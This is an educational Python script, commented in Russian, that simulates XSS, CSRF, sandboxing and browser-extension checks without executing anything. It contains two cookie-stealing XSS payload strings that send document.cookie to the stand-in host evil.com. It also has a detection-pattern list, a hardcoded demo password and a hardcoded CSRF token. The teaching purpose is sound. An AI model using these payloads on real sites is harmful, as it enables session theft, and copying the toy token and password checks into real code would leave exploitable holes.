"""
Обучающая демонстрация концепций веб-безопасности из текста:
- Песочница (sandbox) и изоляция
- XSS (межсайтовый скриптинг) - симуляция
- CSRF (подделка межсайтовых запросов) - симуляция
- Проверка расширений браузера
- Анализ "доверия" к коду
"""

import re
import html
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum


class SecurityLevel(Enum):
    """Уровни безопасности (аналог политик CSP)"""
    UNSAFE = 1          # Выполняется любой код
    SANDBOXED = 2       # Базовая изоляция
    STRICT = 3          # Строгая CSP, нет inline-скриптов


@dataclass
class UserSession:
    """Модель сессии пользователя (аналог cookies/токенов)"""
    user_id: str
    session_token: str
    is_admin: bool = False


class Sandbox:
    """
    Класс-песочница для изолированного выполнения недоверенного кода.
    Аналог того, как браузер изолирует JavaScript.
    """
    
    def __init__(self, name: str, allowed_operations: List[str] = None):
        self.name = name
        self.allowed_operations = allowed_operations or ["read", "display"]
        self.sandboxed_files = {}  # Виртуальные "файлы" внутри песочницы
        
    def execute(self, code: str, context: Dict) -> Dict:
        """
        "Выполняет" код в песочнице (на самом деле только симулирует).
        Реальный код никогда не выполняется через eval/exec!
        """
        print(f"\n🔒 Песочница '{self.name}': выполняем код ->")
        print(f"   Код: {code[:80]}...")
        
        # Проверка на подозрительные операции (аналог политики безопасности)
        suspicious_patterns = [
            (r"document\.cookie", "попытка доступа к cookies"),
            (r"localStorage", "доступ к локальному хранилищу"),
            (r"eval\(", "использование eval()"),
            (r"fetch\(", "сетевой запрос"),
            (r"XMLHttpRequest", "сетевой запрос"),
        ]
        
        for pattern, description in suspicious_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                print(f"   ⚠️  ОБНАРУЖЕНО: {description} — заблокировано песочницей!")
                return {"success": False, "error": f"Operation blocked: {description}"}
        
        # Если код безопасен (по нашей простой проверке)
        print(f"   ✅ Код выполнен в изоляции. Доступ только к виртуальному окружению.")
        return {"success": True, "output": f"Executed in sandbox '{self.name}'"}


class VulnerableCommentSystem:
    """
    Симуляция уязвимой системы комментариев — демонстрация XSS.
    """
    
    def __init__(self):
        self.comments = []
        
    def add_comment_unsafe(self, username: str, comment: str) -> None:
        """
        НЕБЕЗОПАСНО: комментарий не очищается (как в тексте про форму обратной связи)
        """
        self.comments.append({
            "username": username,
            "comment": comment,
            "safe": False
        })
        print(f"   💀 [UNSAFE] Комментарий от {username}: {comment[:50]}...")
        
    def add_comment_safe(self, username: str, comment: str) -> None:
        """
        БЕЗОПАСНО: комментарий очищается (санитизация)
        """
        safe_comment = html.escape(comment)  # Экранирование HTML/JavaScript
        self.comments.append({
            "username": html.escape(username),
            "comment": safe_comment,
            "safe": True
        })
        print(f"   🛡️ [SAFE] Комментарий от {username}: {safe_comment[:50]}...")
        
    def render_comments(self) -> str:
        """Рендеринг комментариев (симуляция отображения в браузере)"""
        output = []
        for c in self.comments:
            if not c["safe"]:
                # Имитация опасного рендеринга — проверяем, нет ли тегов script
                if "<script>" in c["comment"].lower():
                    output.append(f"   🔴 ВНИМАНИЕ! XSS-атака в комментарии от {c['username']}!")
                    output.append(f"      Вредоносный код: {c['comment']}")
            else:
                output.append(f"   💬 {c['username']}: {c['comment']}")
        return "\n".join(output) if output else "   (нет комментариев)"


class CSRFSimulator:
    """
    Симуляция CSRF-атаки — подделка межсайтового запроса.
    """
    
    def __init__(self):
        self.user_sessions: Dict[str, UserSession] = {}
        
    def login(self, user_id: str, password: str) -> Optional[UserSession]:
        """Вход пользователя (создание сессии)"""
        # Упрощённая аутентификация
        if password == "secret":
            session = UserSession(user_id=user_id, session_token=f"token_{user_id}")
            self.user_sessions[session.session_token] = session
            print(f"   ✅ Пользователь {user_id} вошёл в систему")
            return session
        print(f"   ❌ Неверный пароль для {user_id}")
        return None
    
    def transfer_money(self, session_token: str, to_account: str, amount: int) -> bool:
        """
        Операция перевода денег (уязвимая к CSRF, если нет защиты)
        """
        if session_token not in self.user_sessions:
            print(f"   🔴 CSRF: попытка перевода без валидной сессии!")
            return False
            
        session = self.user_sessions[session_token]
        print(f"   💸 Перевод {amount}₽ от {session.user_id} -> {to_account}")
        
        # Здесь могла бы быть реальная логика перевода
        return True
    
    def transfer_with_csrf_protection(self, session_token: str, to_account: str, amount: int, csrf_token: str) -> bool:
        """
        Безопасный перевод с CSRF-токеном
        """
        if session_token not in self.user_sessions:
            return False
        
        # Проверка CSRF-токена (упрощённо)
        expected_token = "secure_csrf_token_123"
        if csrf_token != expected_token:
            print(f"   🛡️ CSRF-защита: неверный токен! Атака предотвращена.")
            return False
            
        return self.transfer_money(session_token, to_account, amount)


class ExtensionManager:
    """
    Менеджер расширений браузера (с проверкой безопасности)
    """
    
    def __init__(self):
        self.installed_extensions = {}
        self.trusted_sources = ["https://chrome.google.com/webstore", "https://addons.mozilla.org"]
        
    def install_extension(self, name: str, source_url: str, permissions: List[str]) -> bool:
        """
        Установка расширения с проверкой источника
        """
        print(f"\n📦 Установка расширения: {name}")
        print(f"   Источник: {source_url}")
        print(f"   Запрашиваемые разрешения: {permissions}")
        
        # Проверка источника
        is_trusted = any(source_url.startswith(trusted) for trusted in self.trusted_sources)
        
        if not is_trusted:
            print(f"   ⚠️  ПРЕДУПРЕЖДЕНИЕ: расширение из НЕДОВЕРЕННОГО источника!")
            print(f"   (как в тексте: 'скачивать только из надежных источников')")
            return False
        
        # Проверка подозрительных разрешений
        dangerous_perms = ["tabs", "cookies", "history", "webRequest", "storage"]
        if any(p in dangerous_perms for p in permissions):
            print(f"   🔴 ВНИМАНИЕ: расширение запрашивает опасные разрешения!")
            print(f"   (может украсть личные данные — как описано в тексте)")
            
        self.installed_extensions[name] = {"source": source_url, "permissions": permissions}
        print(f"   ✅ Расширение '{name}' установлено")
        return True


def demo_xss_attack():
    """Демонстрация XSS-атаки (межсайтовый скриптинг)"""
    print("\n" + "=" * 60)
    print("📌 ДЕМОНСТРАЦИЯ XSS (Cross-Site Scripting)")
    print("   'злоумышленник может разместить фрагмент JavaScript-кода'")
    print("=" * 60)
    
    comment_system = VulnerableCommentSystem()
    
    # Обычный комментарий
    comment_system.add_comment_safe("Алиса", "Отличный сервис!")
    
    # XSS-атака: вредоносный код в комментарии
    malicious_comment = "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
    comment_system.add_comment_unsafe("Злоумышленник", malicious_comment)
    
    # Другой пользователь читает комментарии
    print("\n👤 Пользователь Боб открывает страницу с отзывами:")
    print(comment_system.render_comments())
    
    print("\n🔬 Результат: вредоносный JavaScript был бы выполнен в браузере Боба!")
    print("   Защита: очистка ввода (санитизация), CSP-заголовки")


def demo_csrf_attack():
    """Демонстрация CSRF-атаки"""
    print("\n" + "=" * 60)
    print("📌 ДЕМОНСТРАЦИЯ CSRF (Cross-Site Request Forgery)")
    print("   'позволяет злоумышленнику выдавать себя за пользователя'")
    print("=" * 60)
    
    csrf = CSRFSimulator()
    
    # Пользователь входит в систему
    session = csrf.login("Анна", "secret")
    
    # Легитимная операция
    print("\n✅ Легитимная операция:")
    csrf.transfer_money(session.session_token, "Магазин", 1000)
    
    # CSRF-атака: злоумышленник заставляет браузер отправить запрос
    print("\n💀 CSRF-атака: пользователь кликнул на вредоносную ссылку")
    csrf.transfer_money(session.session_token, "Хакер", 50000)
    
    # С защитой
    print("\n🛡️ С CSRF-защитой (токен):")
    csrf.transfer_with_csrf_protection(session.session_token, "Хакер", 50000, "wrong_token")


def demo_sandbox_isolation():
    """Демонстрация песочницы"""
    print("\n" + "=" * 60)
    print("📌 ПЕСОЧНИЦА (Sandbox)")
    print("   'код выполняется в изолированной среде'")
    print("=" * 60)
    
    # Создаём песочницу
    sandbox = Sandbox("JavaScript Sandbox")
    
    # Безопасный код
    safe_code = "alert('Hello world')"
    sandbox.execute(safe_code, {})
    
    # Вредоносный код (пытается украсть cookies)
    malicious_code = "document.location='http://evil.com/?cookie='+document.cookie"
    sandbox.execute(malicious_code, {})
    
    print("\n🔬 Песочница блокирует доступ к системным ресурсам и данным других страниц")


def demo_extensions():
    """Демонстрация безопасности расширений"""
    print("\n" + "=" * 60)
    print("📌 РАСШИРЕНИЯ БРАУЗЕРА")
    print("   'установка кода из Сети встраивает его в браузер'")
    print("=" * 60)
    
    manager = ExtensionManager()
    
    # Надёжное расширение
    manager.install_extension(
        "Password Manager Pro",
        "https://chrome.google.com/webstore/pass-manager",
        ["storage", "activeTab"]
    )
    
    # Подозрительное расширение из неизвестного источника
    manager.install_extension(
        "Free Coupons",
        "http://malicious-site.ru/coupons",
        ["cookies", "tabs", "history", "webRequest"]
    )
    
    print("\n🔬 Как сказано в тексте: 'аддоны и плагины лучше ставить по мере необходимости")
    print("   и скачивать только из надежных источников'")


def main():
    """Главная функция — запуск всех демонстраций"""
    print("\n" + "█" * 60)
    print("█  ОБУЧАЮЩАЯ ДЕМОНСТРАЦИЯ ВЕБ-БЕЗОПАСНОСТИ")
    print("█  На основе текста о выполнении недоверенного кода")
    print("█" * 60)
    
    demo_xss_attack()
    demo_csrf_attack()
    demo_sandbox_isolation()
    demo_extensions()
    
    print("\n" + "=" * 60)
    print("📚 ВЫВОДЫ (из исходного текста):")
    print("   • 'Сам факт запуска стороннего кода — корень проблем безопасности'")
    print("   • Песочница снижает риски, но не устраняет их полностью")
    print("   • XSS и CSRF — классические атаки через недоверенный ввод")
    print("   • Расширения становятся частью доверенной вычислительной базы")
    print("   • Решение: микроядерные ОС + жёсткое разделение ресурсов")
    print("=" * 60)
    
    print("\n⚠️  ВНИМАНИЕ: Это учебная демонстрация. Никакой вредоносный код не выполняется.")
    print("   В реальной системе НИКОГДА не используйте eval() или exec() с пользовательским вводом.\n")


if __name__ == "__main__":
    main()